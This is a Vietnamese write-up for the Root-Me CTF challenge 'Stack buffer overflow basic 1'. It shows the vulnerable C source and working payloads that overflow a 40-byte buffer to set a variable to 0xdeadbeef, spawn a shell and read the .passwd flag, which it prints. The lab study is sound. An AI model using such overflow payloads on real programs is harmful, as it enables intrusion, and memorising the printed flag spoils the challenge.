# Co-che-hoat-dong-cua-ma-doc - challenge 1 CTF Write up
```html
ELF x86 - Stack buffer overflow basic 1 :  ssh -p 2222 app-systeme-ch13@challenge02.root-me.org
```
![image](https://user-images.githubusercontent.com/64201705/119267106-82396000-bc17-11eb-9fd0-b01bcdd084cc.png)

## Write up

```Text
Sau khi SSH vào server thì ta dùng lệnh cat để in code trong file source code ra
```
Ta sẽ được như này:

```C
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```
Rõ ràng ta thấy để vào được shell bằng câu lệnh:
```C 
system("/bin/bash"); 
``` 
thì ta cần biến check có giá trị là 0xdeadbeef, mặt khác ở hai câu lệnh 
```C   
printf("\n[buf]: %s\n", buf);
printf("[check] %p\n", check); 
``` 
ta thấy chương trình sẽ in ra hai giá trị của buf và check, cho nên ta sẽ nghĩ tới việc ghi đè giá trị buf qua giá trị check ở trong bộ nhớ.
Mặt khác, vì biến buf được cấp bộ nhớ là 40 bytes cho nên trước hết ta sẽ ghi đầy 40 bytes này, sau đó ghi tiếp các bytes khác, các bytes này sẽ tiếp tục ghi lấn tới và ghi đè lên vùng nhớ của biến check, ta thử in 40 kí tự A và thêm 4 kí tự LDLD vào thì ta thấy biến buf và check có giá trị như sau:
```Bash
app-systeme-ch13@challenge02:~$ python -c "print 'A'*40 + 'LDLD'" | ./ch13 

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD
[check] 0x4c444c44

You are on the right way!
```
![image](https://user-images.githubusercontent.com/64201705/119267147-9c733e00-bc17-11eb-8abe-3a7c3ac480da.png)

Như kết quả in ra ta thấy biến check nhận giá trị là 0x4c444c44 ~ LDLD (hex -> text). Do đó để biến check nhận giá trị là 0xdeadbeef, ta sẽ thay đổi câu lệnh thành:
```Bash
app-systeme-ch13@challenge02:~$ python -c "print 'A'*40 + '\xef\xbe\xad\xde'" | ./ch13 

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
Shell closed! Bye.
``` 
Như trên, ta thấy đã chạy được lệnh để gọi shell nhưng chưa thể vào shell và giữ shell hoạt động, ta cần chỉnh lại một chút về câu lệnh bash phía trên thành:
```Bash
app-systeme-ch13@challenge02:~$ cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13
```
Dấu - ở giữa cat và | sẽ giữ cho shell hoạt động và không bị tắt
```Bash
app-systeme-ch13@challenge02:~$ cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
id
uid=1213(app-systeme-ch13-cracked) gid=1113(app-systeme-ch13) groups=1113(app-systeme-ch13),100(users)
cat .passwd
1w4ntm0r3pr0np1s
```
Vậy flag hay password ở đây là:
## 1w4ntm0r3pr0np1s
